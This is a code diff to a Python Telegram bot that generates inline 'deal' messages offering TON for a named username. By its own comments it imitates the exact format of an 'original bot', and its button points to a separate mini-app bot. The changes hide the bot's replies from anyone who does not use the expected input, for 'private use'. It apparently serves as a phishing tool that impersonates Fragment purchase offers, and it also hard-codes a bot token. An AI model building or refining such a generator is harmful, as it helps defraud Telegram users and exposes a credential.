@@ -14,7 +14,7 @@ BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
 PORT = int(os.getenv('PORT', 10000))
 WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"
 
-print(f"🤖 Inline Fragment Deal Generator v4.5")
+print(f"🤖 Inline Fragment Deal Generator v4.6")
 print(f"🔑 Token: ✅")
 print(f"🌐 Port: {PORT}")
 print(f"🔗 Webhook: {WEBHOOK_URL}")
@@ -123,15 +123,16 @@ Important:
             length=len(important_text2)
         ))
     
-    # 5. Wallet cliquable - LONGUEUR CORRECTE (64 caractères)
+    # 5. Wallet cliquable - LONGUEUR CORRECTE (48 caractères: UQ...PR)
     wallet_start = fragment_message.find(wallet_address)
     if wallet_start != -1:
         entities.append(MessageEntity(
             type=MessageEntity.TEXT_LINK,
             offset=wallet_start,
-            length=64,  # Longueur exacte de l'adresse wallet
+            length=48,  # Longueur exacte de UQ...PR (48 caractères)
             url=f"https://tonviewer.com/{wallet_address}"
         ))
+        print(f"🔗 Wallet link: position {wallet_start}, longueur 48 caractères")
     
     # URL du bouton - identique au bot original
     button_url = f"https://t.me/BidRequestApp_bot/?startapp={username.lower()}-{price:g}"
@@ -148,38 +149,17 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
         
         query = update.inline_query.query.strip() if update.inline_query.query else ""
         
-        # Instructions par défaut si pas de requête
+        # Si pas de requête OU format incorrect - AUCUNE RÉPONSE (utilisation privée)
         if not query:
-            results = [
-                InlineQueryResultArticle(
-                    id="help",
-                    title="📝 Comment utiliser ce bot",
-                    description="Tapez: username montant_ton",
-                    input_message_content=InputTextMessageContent(
-                        "ℹ️ **Utilisation du bot:**\n\nTapez: `@votre_bot username montant_ton`\n\n**Exemple:** `@votre_bot johndoe 150`",
-                        parse_mode="Markdown"
-                    )
-                )
-            ]
-            await update.inline_query.answer(results, cache_time=0)
+            await update.inline_query.answer([], cache_time=0)
             return
         
         # Parsing de la requête (username montant)
         parts = query.split()
         
+        # Si format incorrect - AUCUNE RÉPONSE (utilisation privée)
         if len(parts) < 2:
-            results = [
-                InlineQueryResultArticle(
-                    id="error_format",
-                    title="❌ Format incorrect",
-                    description="Format attendu: username montant_ton",
-                    input_message_content=InputTextMessageContent(
-                        "❌ **Format incorrect**\n\nUtilisez: `username montant_ton`\n\n**Exemple:** `johndoe 150`",
-                        parse_mode="Markdown"
-                    )
-                )
-            ]
-            await update.inline_query.answer(results, cache_time=0)
+            await update.inline_query.answer([], cache_time=0)
             return
         
         username = parts[0].replace('@', '')  # Supprime @ si présent
@@ -189,18 +169,8 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
             if ton_amount <= 0:
                 raise ValueError("Montant doit être positif")
         except ValueError:
-            results = [
-                InlineQueryResultArticle(
-                    id="error_amount",
-                    title="❌ Montant invalide",
-                    description="Le montant doit être un nombre positif",
-                    input_message_content=InputTextMessageContent(
-                        "❌ **Montant invalide**\n\nLe montant en TON doit être un nombre positif.\n\n**Exemple:** `johndoe 150`",
-                        parse_mode="Markdown"
-                    )
-                )
-            ]
-            await update.inline_query.answer(results, cache_time=0)
+            # Si montant invalide - AUCUNE RÉPONSE (utilisation privée)
+            await update.inline_query.answer([], cache_time=0)
             return
         
         # Génération du message avec le format exact du bot original
@@ -210,7 +180,7 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
         current_ton_price = get_ton_price()
         current_usd_value = ton_amount * current_ton_price
         
-        # Résultat inline
+        # Résultat inline - SEULEMENT si format correct
         results = [
             InlineQueryResultArticle(
                 id=f"deal_{username}_{ton_amount}_{int(time.time())}",
